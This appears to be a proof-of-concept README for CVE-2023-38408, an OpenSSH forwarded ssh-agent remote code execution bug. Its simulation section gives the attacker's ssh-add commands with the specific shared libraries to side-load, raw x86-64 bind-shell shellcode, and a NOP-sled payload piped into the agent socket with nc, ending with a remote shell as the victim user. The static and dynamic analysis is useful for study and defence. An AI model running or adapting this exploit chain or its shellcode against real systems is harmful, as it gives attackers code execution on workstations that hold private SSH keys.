## CVE-2023-38408 : Remote Code Execution in OpenSSH's forwarded ssh-agent

### Content
- Summary
- PoC
- Simulation

### Summary
Abusing the side effects `dlopen()` and `dlclose()`, while chaining four side effects of shared libraries from official distribution packages, into a one-shot remote code execution in ssh-agent (despite ASLR, PIE, and NX), which is a remote version of [CVE-2010-3856](https:.seclists.org.fulldisclosure.2010.Oct.344), which was published in 2010 by Tavis Ormandy.

### PoC
#### Definiton
First let's take a look into the [definition](https:.man.openbsd.org.ssh-agent.1) of the ssh-agent:
![](img/ssg-agent-def.png)

Howerver, if you pay a closer attention into the [ssh](https:.man.openbsd.org.ssh.1) manual, you will find this warning:
![](img/ssh_warning.png)

#### Static Analysis
After reading the source code we end up with the following notes :
1. The remote attacker, who has access to the remote server where Alice's ssh-agent is forwarded to, can load (dlopen()) and immediately unload (dlclose()) any shared library in .usr.lib* on Alice's workstation (via her forwarded ssh-agent, if it is compiled with ENABLE_PKCS11, which is the default).

2. Ssh-agent does not actually load such a shared library in its own address space (where private keys are stored), but in a separate, dedicated process, ssh-pkcs11-helper.

3. No operation besides `dlopen()` and `dlclose()` is generally performed by ssh-agent on a shared library.

4. Although the ability to load and unload shared libraries from .usr.lib* in ssh-agent bears a striking resemblance to CVE-2010-3856, we are in a much weaker position here, because we are trying to exploit ssh-agent remotely, so we do not control its environment variables nor its umask (and we do not even talk directly to ssh-pkcs11-helper, which actually dlopen()s and dlclose()s the shared libraries: we talk to ssh-agent, which canonicalizes and filters our requests before passing them on to ssh-pkcs11-helper).

5. We do not control anything except the order in which we load (and immediately unload) shared libraries from .usr.lib* in ssh-agent.

#### Dymanic Analysis
To further more the investigation we are going to systrace the `dlopen()` and `dlclose()` of every shared library in the default installation of Ubuntu Desktop, and we instantly observed four surprising behaviors:

1. Some shared libraries require an executable stack, either explicitly because of an RWE (readable, writable, executable) GNU_STACK ELF header, or implicitly because of a missing GNU_STACK ELF header (in which case the loader defaults to an executable stack): when such an "execstack" library is dlopen()ed, the loader makes the main stack and all thread stacks executable, and they remain executable even after dlclose().

    - For example, .usr.li2.systemd.boot.efi.linuxx64.elf.stub in the default
    installation of Ubuntu Desktop 22.04.

2. Many shared libraries are marked as "nodelete" by the loader, either explicitly because of a NODELETE ELF flag, or implicitly because they are in the dependency list of a NODELETE library: the loader will never unload (munmap()) such libraries, even after they are dlclose()d.

    - For example, .usr.li2.x86_64-linux-gnu.librt.so.1 in the default
    installation of Ubuntu Desktop 22.04 and 21.10.


3. Some shared libraries register a signal handler for SIGSEGV when they are dlopen()ed, but they do not deregister this signal handler when they are dlclose()d (i.e., this signal handler is still registered when its code is munmap()ed).

    - For example, .usr.li2.x86_64-linux-gnu.libSegFault.so in the default
    installation of Ubuntu Desktop 21.10.


4. Some shared libraries crash with a SIGSEGV as soon as they are dlopen()ed (usually because of a NULL-pointer dereference), because they are supposed to be loaded in a specific context, not in a random program such as ssh-agent.

    - For example, most of the .usr.li2.x86_64-linux-gnu.xtables.lib*.so in
    the default installation of Ubuntu Desktop 22.04 and 21.10.

### Poc
From the previous findings we can come up with the following attack vector :

1. make ssh-agent's stack executable (more precisely,
ssh-pkcs11-helper's stack) by dlopen()ing one of the "execstack"
libraries ("surprising behavior 1/"), and somehow store a 1990-style
shellcode somewhere in this executable stack;

2. register a signal handler for SIGSEGV and immediately munmap() its
code, by dlopen()ing and dlclose()ing one of the shared libraries from
"surprising behavior 3/" (consequently, a dangling pointer to this
unmapped signal handler is retained in the kernel);

3. replace the unmapped signal handler's code with another piece of code
from another shared library, by dlopen()ing (mmap()ing) one of the
"nodelete" libraries ("surprising behavior 2/");

4. raise a SIGSEGV by dlopen()ing one of the shared libraries from
"surprising behavior 4/", so that the unmapped signal handler is called
by the kernel, but the replacement code from the "nodelete" library is
executed instead (a use-after-free of sorts);

5. hope that this replacement code (which is mapped where the signal
handler was mapped) is a useful gadget that somehow jumps into the
executable stack, exactly where our shellcode is stored.

### Simulation
This Attack has been simulated on a default Ubuntu Desktop 22.04, (you can check the **lab** folder under this repository, which contain a docker environment to simulate the attack scenario) and goes as the following :

1. First thing first we are gonna try to get an executable stack on `ssh-pks11-helper` process, and to do this there is several libraries that can be side-loaded, in this simulation I am gonna use the : `/usr/lib/systemd/boot/efi/linuxx64.elf.stub`.

```bash     
root@attacker:~$ echo /tmp/ssh-*/agent.*
/tmp/ssh-NqLP6il36s/agent.3452
root@attacker:~$ export SSH_AUTH_SOCK=/tmp/ssh-NqLP6il36s/agent.3452
root@attacker:~$ ssh-add -s /usr/lib/systemd/boot/efi/linuxx64.elf.stub
Enter passphrase for PKCS#11: 
Could not add card "/usr/lib/systemd/boot/efi/linuxx64.elf.stub": agent refused operation
```

And to verify our flag, we can start another gdb instance after graping the PID of the running `ssh-pks11-helper` process.


```bash        
alice@workstation:~$ ps -aux | grep pkcs11-helperalice
12242 0.0 0.2 7788 5520 ? S 09:22 0:00 /usr/lib/openssh/ssh-pkcs11-helper
alice@workstation:~$ sudo gdb -p 12242
[snip]
29 ../sysdeps/unix/sysv/linux/poll.c: No such file or directory. (gdb) info proc mappings process 12242 Mapped address spaces:
Start Addr End Addr Size Offset Perms objfile
[snip]
0x7ffc7a83b000 0x7ffc7a85c000 0x21000 0x0 rwxp
[stack]
0x7ffc7a9df000 0x7ffc7a9e3000 0x4000 0x0 r--p
[vvar]
0x7ffc7a9e3000 0x7ffc7a9e5000 0x2000 0x0 r-xp
[vdso]
0xffffffffff600000 0xffffffffff601000 0x1000 0x0 --xp 
[snip]   
```

2. Now that we successfully bypassed the protection against executing code on the stack, we can continue our attack and craft our shellcode which we then gonna transfer to the agent's memory (workstation).
```sh
root@attacker:~$ SHELLCODE=$'\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0\x6a\x02\x5f\x6a\x01\x5e\x6a\x06\x5a\x6a\x29\x58\x0f\x05\x49\x89\xc0\x4d\x31\xd2\x41\x52\x41\x52\xc6\x04\x24\x02\x66\xc7\x44\x24\x02\x7a\x69\x48\x89\xe6\x41\x50\x5f\x6a\x10\x5a\x6a\x31\x58\x0f\x05\x41\x50\x5f\x6a\x01\x5e\x6a\x32\x58\x0f\x05\x48\x89\xe6\x48\x31\xc9\xb1\x10\x51\x48\x89\xe2\x41\x50\x5f\x6a\x2b\x58\x0f\x05\x59\x4d\x31\xc9\x49\x89\xc1\x4c\x89\xcf\x48\x31\xf6\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x48\x31\xff\x57\x57\x5e\x5a\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x54\x5f\x6a\x3b\x58\x0f\x05'
root@attacker:~$ (python3 -c 'print "\0\0\x27\xbf\x14\0\0\0\x10/usr/lib/modules\0\0\x27\xa6" . "\x90" x 10000'; echo -n "$SHELLCODE") | nc -U "$SSH_AUTH_SOCK"
```
**Note:**
- I am adding a bunch of `\x90` (NOPs). The reason why is to provide a larger target for the program execution flow to land on during the gadget execution.
- Observe that `$rsp+10100` contains a series of NOP (No Operation) instructions followed by the start of the shellcode: `0x31 0xc0 0x48 0x31 0xc0 0xff 0x48`.

```bash       
(gdb) x/100xgb $rsp+10100
0x7ffc7a85994c: 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90
0x7ffc7a859954: 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90
0x7ffc7a85995c: 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90
0x7ffc7a859964: 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90
0x7ffc7a85996c: 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90
0x7ffc7a859974: 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90
0x7ffc7a85997c: 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90
0x7ffc7a859984: 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90
0x7ffc7a85998c: 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90
0x7ffc7a859994: 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90
0x7ffc7a85999c: 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90
0x7ffc7a8599a4: 0x90 0x90 0x90 0x90 0x90 0x48 0x31 0xc0
0x7ffc7a8599ac: 0x48 0x31 0xff 0x48
```

3. Now that we have an executable stack, and a shellcode, our last step is leveraging our malicious signal handler, which is gonna give us the power to execute our shellcode whenever the `SIGSEGV` signal occurs.

To register the signal :
```bash
root@attacker:~$ ssh-add -s /usr/lib/titan/libttcn3-rt2-dynamic.so
Enter passphrase for PKCS#11:
Could not add card "/usr/lib/titan/libttcn3-rt2-dynamic.so": agent refused operation
```
Again to register a signal there is many options, feel free to use the fuzzer and explore other possibilities!

Now that we have a new signal handler, we have to redirect the routine, or better say the program's execution flow and jump into the stack when the `SIGSEGV` signal is triggered.

```bash  
root@attacker:~$ ssh-add -s /usr/lib/x86_64-linux-gnu/libKF5SonnetUi.so.5.92.0
Enter passphrase for PKCS#11: 
Could not add card "/usr/lib/x86_64-linux-gnu/libKF5SonnetUi.so.5.92.0": agent refused operation
```

**Note :**
- At this stage, the exploit leverages the technique of side-loading another library to replace the current signal handler's code with an alternative code segment that will jump to the stack where the shellcode is stored.
- To ensure that the code segments of this new library remain mapped in memory even after `dlclose()` is invoked, the library must be marked with the `"Nodelete"` attribute. Ordinarily, when `dlclose()` is called to close a shared library, the library's code segments are unloaded from memory, and any associated resources are released. However, by utilizing the `"Nodelete"` attribute, the attacker prevents the code segments from being unloaded, effectively preserving their existence in memory beyond the `dlclose()` operation. This ensures that the replacement code, responsible for jumping to the shellcode in the stack, remains accessible and functional throughout the exploit's execution.

5. Last but not least we have to trigger a segfault. How ? Yes, you are right, intentionally causing a segmentation fault, the `SIGSEGV` event :

```bash    
root@attacker:~$ ssh-add -s /usr/lib/x86_64-linux-gnu/libns3.35-wave.so.0.0.0
Enter passphrase for PKCS#11: 
```
And, voila !

```bash
root@attacker:~$ nc localhost 31337
whoami
alice
```
